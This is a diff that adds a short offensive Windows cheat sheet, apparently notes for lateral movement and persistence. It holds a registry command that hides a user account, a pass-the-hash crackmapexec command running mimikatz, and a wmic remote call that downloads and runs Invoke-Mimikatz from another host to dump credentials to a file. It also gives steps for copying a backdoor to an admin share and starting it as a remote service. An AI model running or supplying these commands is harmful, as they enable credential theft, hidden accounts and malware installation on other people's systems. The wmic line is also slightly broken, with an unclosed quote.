@@ -1,1 +1,12 @@
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\WinLogon\SpecialAccounts\UserList" /V account_name /T REG_DWORD /D 0
+crackmapexec smb <target> -u <username> -d <domain or local> -H <Hashvalue> -M mimikatz
+wmic /USER:"domain\user" /PASSWORD:"Userpassword" /NODE:10.10.10.4 processcall create "powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.12/Invoke-Mimikatz.ps1'); Invoke-MimiKatz-DumpCreds | Out-File C:\\users\\public\\creds.txt
+
+
+net use \\advanced\c$/user:advanced\username password
+      • dir \\advanced\c$
+      • Copy the backdoor that’s been created using Shellter or Veil to the shared folder
+      • Create a service called backtome
+      •  Sc \\remotehost create backtome binpath="c:\xx\malware.exe"
+      •  Sc remotehost start backtome  
 
